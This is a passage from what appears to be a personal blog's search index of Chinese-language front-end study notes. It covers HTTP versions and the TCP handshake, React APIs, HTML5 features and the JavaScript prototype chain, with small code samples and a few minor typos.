keep-alive</li><li>新增24个错误状态响应码</li></ul><p><br><br><strong>HTTP1.0和1.1存在的问题</strong></p><ul><li>明文传输</li><li>请求头内容过大，每次请求header基本不怎么变化，增加了传输成本</li><li>虽然HTTP1.x支持了keep-alive，来弥补多次创建连接产生的延迟，但是keep-alive使用多了同样会给服务端带来大量的性能压力，并且对于单个文件被不断请求的服务(例如图片存放网站)，keep-alive可能会极大的影响性能，因为它在文件被请求之后还保持了不必要的连接很长时间</li></ul><p><br><br><strong>HTTP2.0新特性</strong></p><ul><li>二进制格式<br>HTTP1.X的解析是基于文本，二进制则只认0和1的组合，方便且健壮。</li><li>多路复用<br>连接共享。一个request对应一个id，这样一个连接上可以有多个request，request可以随机的混杂在一起，接收方可以根据request的id将request再归属到各自不同的服务端请求里。某个请求耗时严重，不会影响其他请求的正常执行。</li><li>header压缩<br>通讯双方各自cache一份header fields表，避免了重复header的传输，又减少了传输的大小</li><li>服务端推送<br>服务端推送能把客户端所需要的资源伴随着index.html一起发送到客户端，省去了客户端重复请求的步骤。正因为没有发起请求，建立连接等操作，所以静态资源通过服务端推送的方式可以极大地提升速度。</li></ul><p><br><br><em>9. 大文件上传中断，怎么重连？</em></p><p><br></p><p><br><br><em>11. Chrome无痕模式</em><br>从功能上明确无痕浏览的作用，涉及的功能包括：Bookmark, History(input, browser, download, forms/auto complete), SSL certs, Cookie, local storage, webSQL, Application cache, HTTP Cache, Disk Cache, Web App/Plugin。</p><ul><li><p>从正常模式进入无痕模式<br>进入无痕模式前的信息是否会在无痕下使用<br><img src="/2019/08/16/HTTP/1.jpeg" style="margin: 30px auto"></p></li><li><p>再次进入无痕模式<br>在前一无痕模式下设置的项目，是否可以在下一次无痕模式下使用<br><img src="/2019/08/16/HTTP/2.jpeg" style="margin: 30px auto"></p></li></ul><p><br><br><em>12. HTTP2.0的多路复用和HTTP1.X中的长连接复用有什么区别？</em></p><ul><li>HTTP/1.*<br>一次请求-相应，建立一个连接，用完关闭；每一个请求都要建立一个连接</li><li>HTTP/1.1 Pipeling<br>若干个请求排队串行化单线程处理，后面的请求等待前面请求的返回才能获得执行机会，一旦有某请求超时等，后续请求只能被阻塞。</li><li>HTTP/2<br>多个请求可同时在一个连接上并行执行。某个请求任务耗时严重，不会影响到其他连接的正常执行。<br><img src="/2019/08/16/HTTP/3.png" style="max-width:500px; margin: 30px auto"></li></ul><p><br><br><em>13. 为什么需要三次握手和四次挥手</em></p><p><strong>三次握手</strong></p><ul><li>第一次握手：客户端给服务器发送一个 SYN 报文。客户端处于SYN_send状态。</li><li>第二次握手：服务器收到 SYN 报文之后，会应答一个 SYN+ACK 报文。服务器处于SVN_REVD状态。</li><li>第三次握手：客户端收到 SYN+ACK 报文之后，会回应一个 ACK 报文。客户端处于establised状态。</li><li>服务器收到 ACK 报文之后，三次握手建立完成。服务器处于establised状态。</li></ul><p><br><br><strong>三次握手的作用</strong></p><ul><li>为了确认双方的接收和发送能力是否正常。</li><li>指定自己的初始化序列号，为后面的可靠传送做准备。</li><li>如果是 https 协议的话，三次握手这个过程，还会进行数字证书的验证以及加密密钥的生成。<br><img src="/2019/08/16/HTTP/4.png" style="max-width: 500px; margin: 30px auto"></li></ul><p><br><br><strong>四次挥手</strong></p><ul><li>第一次挥手：客户端发送一个 FIN 报文，报文中会指定一个序列号。此时客户端处于FIN_WAIT1状态。</li><li>第二次握手：服务端收到 FIN 之后，会发送 ACK 报文，且把客户端的序列号值 + 1 作为 ACK 报文的序列号值，表明已经收到客户端的报文了，此时服务端处于 CLOSE_WAIT状态。</li><li>第三次挥手：如果服务端也想断开连接了，和客户端的第一次挥手一样，发给 FIN 报文，且指定一个序列号。此时服务端处于 LAST_ACK 的状态。</li><li>第四次挥手：客户端收到 FIN 之后，一样发送一个 ACK 报文作为应答，且把服务端的序列号值 + 1 作为自己 ACK 报文的序列号值，此时客户端处于 TIME_WAIT 状态。需要过一阵子以确保服务端收到自己的 ACK 报文之后才会进入 CLOSED 状态</li><li>服务端收到 ACK 报文之后，就处于关闭连接了，处于 CLOSED 状态。</li></ul><p><img src="/2019/08/16/HTTP/5.png" style="max-width: 500px; margin: 30px auto"></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li>《图解HTTP》</li><li><a href="https://juejin.im/post/5cf765275188257c6b51775f" target="_blank" rel="noopener">前端大文件上传</a></li><li><a href="http://www.nbsite.cn/database/176" target="_blank" rel="noopener">shadowsock原理详解</a></li><li><a href="https://blog.csdn.net/horkychen/article/details/21054807" target="_blank" rel="noopener">Chrome的无痕浏览实现初探</a></li><li><a href="https://juejin.im/entry/5981c5df518825359a2b9476" target="_blank" rel="noopener">HTTP1.0、HTTP1.1 和 HTTP2.0 的区别</a></li><li><a href="https://juejin.im/post/5ccd0dfc6fb9a0324a08bb73" target="_blank" rel="noopener">关于三次握手与四次挥手面试官想考我们什么？</a></li><li><a href="https://juejin.im/post/5d0c703351882532bd607cab" target="_blank" rel="noopener">Http,Socket,Tcp,Udp,Ip原理区别</a></li><li><a href="https://juejin.im/entry/58077fab0e3dd900572bc35b" target="_blank" rel="noopener">HTTPS 原理剖析与项目场景</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React与React-Dom API</title>
      <link href="/2019/08/07/React%E4%B8%8EReact-Dom/"/>
      <url>/2019/08/07/React%E4%B8%8EReact-Dom/</url>
      <content type="html"><![CDATA[<h4 id="1-React-API"><a href="#1-React-API" class="headerlink" title="1. React API"></a>1. React API</h4><p>React是React库的入口，通过script, import等方法，可以获得React的顶层API。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span></span><br></pre></td></tr></table></figure></p><h4 id="1-1-定义组件"><a href="#1-1-定义组件" class="headerlink" title="1.1 定义组件"></a>1.1 定义组件</h4><p>使用React组件可以将UI拆分为独立且复用的代码片段，每部分都可独立维护。你可以通过<code>React.Component</code> 或 <code>React.PureComponent</code> 来定义React组件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Greeting</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;this.props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果你的函数组件在给定相同props的情况下渲染相同的结果，那么你可以通过将其包装在<code>React.memo</code>中调用，以此通过记忆组件渲染结果的方式来提高组件的性能表现。这意味着在这种情况下，React 将跳过渲染组件的操作并直接复用最近一次渲染的结果。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> MyComponent = React.memo(<span class="function"><span class="keyword">function</span> <span class="title">MyComponent</span>(<span class="params">props</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#### 1.2 创建元素</span></span><br><span class="line"><span class="string">我们一般使用JSX来编写UI组件。实际上，每个JSX元素都是调用`</span>React.createElement()<span class="string">`的语法糖。如果你使用了JSX，就不需要调用这个方法。</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line"><span class="comment">// 创建元素</span></span><br><span class="line">React.createElement(type, [props], [...children])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 克隆元素</span></span><br><span class="line">React.cloneElement(element, [props], [...children])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证对象是否为React元素</span></span><br><span class="line">React.isValidElement(object)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提供了用于处理this.props.children不透明数据结构的方法</span></span><br><span class="line">React.Children.map(children, <span class="function"><span class="keyword">function</span>(<span class="params">[thisArg]</span>))</span></span><br></pre></td></tr></table></figure></p><h4 id="1-3-Fragments"><a href="#1-3-Fragments" class="headerlink" title="1.3 Fragments"></a>1.3 Fragments</h4><p><code>&lt;React.Fragment&gt;&lt;/React.Fragment&gt;</code>，简写语法<code>&lt;&gt;&lt;/&gt;</code>，组件能够在不额外创建DOM元素的情况下，让render()方法返回多个元素。</p><h4 id="1-5-Refs"><a href="#1-5-Refs" class="headerlink" title="1.5 Refs"></a>1.5 Refs</h4><p><code>React.createRef</code>创建一个能够通过ref属性附加到React元素的ref<br>React.forwardRef</p><h4 id="1-6-Suspense"><a href="#1-6-Suspense" class="headerlink" title="1.6 Suspense"></a>1.6 Suspense</h4><p>使得组件可以等待某些操作结束后，再进行渲染。<br>React.lazy<br>React.Suspense</p><h4 id="1-7-Hook"><a href="#1-7-Hook" class="headerlink" title="1.7 Hook"></a>1.7 Hook</h4><p><br></p><h3 id="2-React-Dom-API"><a href="#2-React-Dom-API" class="headerlink" title="2. React-Dom API"></a>2. React-Dom API</h3>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>HTML5新特性</title>
      <link href="/2019/08/07/HTML5%E6%96%B0%E7%89%B9%E6%80%A7/"/>
      <url>/2019/08/07/HTML5%E6%96%B0%E7%89%B9%E6%80%A7/</url>
      <content type="html"><![CDATA[<h4 id="1-语义化标签"><a href="#1-语义化标签" class="headerlink" title="1. 语义化标签"></a>1. 语义化标签</h4><p>以前我们都是使用<code>&lt;div&gt;</code>标签布局，div标签的语义不清晰，html5为了规范这一块，给出了一系列的标签。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span><span class="tag">&lt;/<span class="name">header</span>&gt;</span>     头部区域标签，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span><span class="tag">&lt;/<span class="name">footer</span>&gt;</span>     底部区域标签，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>           导航区域标签，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">aside</span>&gt;</span><span class="tag">&lt;/<span class="name">aside</span>&gt;</span>       侧边栏区域标签，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span>   定义 section，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span><span class="tag">&lt;/<span class="name">article</span>&gt;</span>   文章段落标签，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span><span class="tag">&lt;/<span class="name">summary</span>&gt;</span>   定义 details 元素的标题，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">detailes</span>&gt;</span><span class="tag">&lt;/<span class="name">detailes</span>&gt;</span> 定义元素的细节，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">mark</span>&gt;</span><span class="tag">&lt;/<span class="name">mark</span>&gt;</span>         标记记号标签，内联标签</span><br><span class="line"><span class="tag">&lt;<span class="name">time</span>&gt;</span><span class="tag">&lt;/<span class="name">time</span>&gt;</span>         时间区域标签，内联标签</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-表单新类型"><a href="#2-表单新类型" class="headerlink" title="2. 表单新类型"></a>2. 表单新类型</h4><p><code>&lt;input&gt;</code>表单标签的新类型<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"email"</span> /&gt;</span>  e-mail 地址的输入域</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> /&gt;</span> 数字输入域</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"url"</span> /&gt;</span>    URL 地址的输入域</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"range"</span> /&gt;</span>  range 类型显示为滑动条，默认value值是1~100的限定范围</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"range"</span> <span class="attr">name</span>=<span class="string">"points"</span> <span class="attr">min</span>=<span class="string">"1"</span> <span class="attr">max</span>=<span class="string">"10"</span> /&gt;</span>  可以通过min属性和max属性自定义范围</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span> /&gt;</span> 用于搜索域</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"color"</span> /&gt;</span>  用于定义选择颜色</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"tel"</span> /&gt;</span>    电话号码输入域</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"date"</span> /&gt;</span>   date类型为时间选择器</span><br></pre></td></tr></table></figure></p><p><code>input</code>新增的新属性</p><ul><li><code>placeholder</code>: string, 文本框的默认提示，在用户输入后消失</li><li><code>required</code>: boolean, 要求文本框不能为空</li><li><code>pattern</code>: regex, 用于验证值的正则</li><li><code>min</code>, <code>max</code>: 设置元素的最大最小值</li><li><code>step</code>: 输入域规定的数字间隔</li><li><code>width</code>, <code>height</code>: 宽高</li><li><code>autofocus</code>: boolean, 页面加载时，域自动获得焦点</li><li><code>multiple</code>: booelan, 规定元素可选择多个值</li></ul><p><br></p><h4 id="3-视频和音频"><a href="#3-视频和音频" class="headerlink" title="3. 视频和音频"></a>3. 视频和音频</h4><p><code>&lt;audio&gt;</code>支持的音频格式有 mp3, Wav, Ogg。<br><code>&lt;video&gt;</code>支持 mp4, WebM, Ogg。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">"1.mp3"</span> <span class="attr">id</span>=<span class="string">"audio"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">"600"</span> <span class="attr">height</span>=<span class="string">"400"</span> <span class="attr">id</span>=<span class="string">"video"</span> <span class="attr">controls</span>=<span class="string">"controls"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"video/jieda2.mp4"</span> <span class="attr">type</span>=<span class="string">"audio/mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>视频和音频常用的方法</p><ul><li><code>play()</code>  开始播放</li><li><code>pause()</code> 暂停播放</li><li><code>load()</code>  重新加载音频/视频</li></ul><p>视频和视频常用的属性</p><ul><li><code>controls</code> 是否显示播放/暂停控件</li><li><code>defaultPlaybackRate</code> 设置默认播放速度</li><li><code>duration</code> 返回当前音频/视频的长度(以秒计)</li><li><code>ended</code> 返回音频/视频是否已结束</li><li><code>loop</code> 设置或返回音频/视频是否应在结束时重新播放</li><li><code>muted</code> 设置或返回音频/视频是否静音</li><li><code>networkState</code> 返回音频/视频的当前网络状态</li><li><code>src</code> 设置或返回音频/视频元素的当前来源</li><li><code>volume</code> 设置或返回音频/视频的音量</li><li><code>readyState</code> 返回音频/视频当前的就绪状态</li><li><code>played</code> 表示音频/视频已播放部分的 TimeRanges 对象</li></ul><p><br></p><h4 id="4-canvas"><a href="#4-canvas" class="headerlink" title="4. canvas"></a>4. canvas</h4><p><code>canvas</code> 元素用于在网页上绘制图形,canvas标签本身只是个图型容器，需要使用javaScript脚本来绘制图形。</p><p><br></p><h4 id="5-SVG"><a href="#5-SVG" class="headerlink" title="5. SVG"></a>5. SVG</h4><p>SVG是指可伸缩的矢量图形，SVG 也是一种使用 XML 描述 2D 图形的语言。我们可以为某个元素附加 JavaScript 事件处理器。在 SVG 中，每个被绘制的图形均被视为对象。如果 SVG 对象的属性发生变化，那么浏览器能够自动重现图形。</p><p><br></p><h4 id="6-拖放-Drag和Drop"><a href="#6-拖放-Drag和Drop" class="headerlink" title="6. 拖放(Drag和Drop)"></a>6. 拖放(Drag和Drop)</h4><p>在h5之前实现拖拽功能，用的是<code>onmousedown</code>，获取当前的一些信息，然后在<code>onmousemove</code>时不断更新拖拽对象的<code>left</code>和<code>top</code>值，最后在<code>onmouseup</code>时对拖拽对象彻底复制，并释放后一系列的程序操作。</p><p>h5出来后，不需要再模拟，因为已经有了标准的事件api<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"draggable"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"draggable"</span> draggable=<span class="string">"true"</span>&gt;</span><br><span class="line">draggable</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">var dragEl = document.getElementById('draggable');</span></span><br><span class="line"><span class="regexp">var l = null, t = null;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">dragEl.ondragstart = function (e) &#123; /</span><span class="regexp">/ 准备推拽时</span></span><br><span class="line"><span class="regexp">  l = e.clientX - this.offsetLeft, t = e.clientY - this.offsetTop;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">dragEl.ondrag = function (e) &#123;  /</span><span class="regexp">/ 拖拽进行时</span></span><br><span class="line"><span class="regexp">  var x = e.clientX, y = e.clientY;</span></span><br><span class="line"><span class="regexp">  this.style.left = x - l + 'px';</span></span><br><span class="line"><span class="regexp">  this.style.top = y - t + 'px';</span></span><br><span class="line"><span class="regexp">  console.log(x, y, l , t)</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">dragEl.ondragend = function (e) &#123;   /</span><span class="regexp">/ 拖拽结束时</span></span><br><span class="line"><span class="regexp">  var x = e.clientX, y = e.clientY;</span></span><br><span class="line"><span class="regexp">  this.style.left = x - l + 'px';</span></span><br><span class="line"><span class="regexp">  this.style.top = y - t + 'px';</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="7-地理位置"><a href="#7-地理位置" class="headerlink" title="7. 地理位置"></a>7. 地理位置</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">navigator.geolocation.getCurrentPosition(successPos)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">successPos</span> (<span class="params">pos</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'定位时间：'</span>,pos.timestamp)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'经度：'</span>,pos.coords.longitude)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'纬度：'</span>,pos.coords.latitude)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'海拔：'</span>,pos.coords.altitude)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'速度：'</span>,pos.coords.speed)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="8-离线存储"><a href="#8-离线存储" class="headerlink" title="8. 离线存储"></a>8. 离线存储</h4><p>HTML5，通过创建 cache manifest 文件，可以创建 web 应用的离线版本</p><p><br></p><h4 id="9-Web存储"><a href="#9-Web存储" class="headerlink" title="9. Web存储"></a>9. Web存储</h4><p><code>localStorage</code> 没有时间限制的数据存储.<br><code>sessionStorage</code> 网页还没有关闭的情况下的存储，网页窗口关闭，则数据销毁。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">localStorage.setItem(<span class="string">'key'</span>, <span class="string">'val'</span>)  <span class="comment">// 存储数据</span></span><br><span class="line">localStorage.getItem(<span class="string">'key'</span>)         <span class="comment">// 取数据</span></span><br><span class="line">localStorage.removeItem(<span class="string">'key'</span>)      <span class="comment">// 删除数据</span></span><br><span class="line">localStorage.clear()                <span class="comment">// 删除所有数据</span></span><br><span class="line">localStorage.key(index)             <span class="comment">// 获取某个索引数据</span></span><br><span class="line"></span><br><span class="line">sessionStorage.setItem(<span class="string">'key'</span>, <span class="string">'val'</span>)<span class="comment">// 存储数据</span></span><br><span class="line">sessionStorage.getItem(<span class="string">'key'</span>)       <span class="comment">// 取数据</span></span><br><span class="line">sessionStorage.removeItem(<span class="string">'key'</span>)    <span class="comment">// 删除数据</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="10-WebSocket"><a href="#10-WebSocket" class="headerlink" title="10. WebSocket"></a>10. WebSocket</h4><p>websocket事件</p><ul><li>Socket.onopen 连接建立时触发</li><li>Socket.onmessage 客户端接收服务端数据时触发</li><li>Socket.onerror 通信发生错误时触发</li><li>Socket.onclose 连接关闭时触发</li></ul><p><br></p><h4 id="11-Web-Workers"><a href="#11-Web-Workers" class="headerlink" title="11. Web Workers"></a>11. Web Workers</h4><p>web worker 是运行在后台的 JavaScript，独立于其他脚本，不会影响页面的性能。您可以继续做任何愿意做的事情。</p><p><br></p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://juejin.im/post/5be8d817e51d457f7a4aba13" target="_blank" rel="noopener">HTML5的新特性概述（上）</a></li><li><a href="https://juejin.im/post/5bea349a518825170d1a9db1" target="_blank" rel="noopener">HTML5新特性概述(下)</a></li></ul>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JS原型链与继承</title>
      <link href="/2019/08/07/JS%E5%8E%9F%E5%9E%8B%E9%93%BE/"/>
      <url>/2019/08/07/JS%E5%8E%9F%E5%9E%8B%E9%93%BE/</url>
      <content type="html"><![CDATA[<h3 id="1-原型链"><a href="#1-原型链" class="headerlink" title="1. 原型链"></a>1. 原型链</h3><p>JavaScript 对象有一个指向一个原型对象的链。当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.a = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// f.prototype用于指向对象f的原型</span></span><br><span class="line"><span class="comment">// 在f函数的原型上定义属性</span></span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f();</span><br><span class="line"><span class="comment">// o的整个原型链如下:</span></span><br><span class="line"><span class="comment">// &#123;a:1, b:2&#125; ---&gt; &#123;b:3, c:4&#125; ---&gt; Object.prototype---&gt; null</span></span><br></pre></td></tr></table></figure></p><p>每个函数都有一个 prototype 属性，这个属性是一个指针，指向一个对象。原型对象的好处是，可以让每个实例都有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度地节省了内存。</p><h3 id="2-prototype和-proto的区别"><a href="#2-prototype和-proto的区别" class="headerlink" title="2. prototype和__proto的区别"></a>2. prototype和__proto的区别</h3><p>一个对象A的<code>__proto__</code>属性指向对象B,那么B就是A的原型对象（或者叫父对象）。对象A可以对象B中的属性和方法，同时也可以使用对象B的原型对象C上的属性和方法。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Parent(<span class="string">'张三'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Parent.prototype);  <span class="comment">// Parent &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(p.prototype);       <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(Parent.__proto__);  <span class="comment">// [Function], Parent是Function的实例</span></span><br><span class="line"><span class="built_in">console</span>.log(p.__proto__);       <span class="comment">// Parent &#123;&#125; 执行Parent的原型</span></span><br></pre></td></tr></table></figure></p><p><code>__proto</code>指向对象的原型对象（父对象）。<br><code>prototype</code>用于创建经典的构造函数。prototyep是在new创建对象时用来构建<strong>proto</strong>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Parent.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="1-Function，object，-class"><a href="#1-Function，object，-class" class="headerlink" title="1. Function，object， class"></a>1. Function，object， class</h3><p>Function可以当做Object的构造函数，new一个Function时，会返回一个对象。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Parent(<span class="string">'张三'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(Parent.prototype); <span class="comment">// Parent &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(p.prototype);      <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></p><p>构造函数本身是一个Function， 而构造函数返回的实例是一个Object。构造函数Function有prototype属性，而实例Object没有prototype属性。</p>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>electron搭建React-app</title>
      <link href="/2019/08/05/electron%E6%90%AD%E5%BB%BAReact-app/"/>
      <url>/2019/08/05/electron%E6%90%AD%E5%BB%BAReact-app/</url>
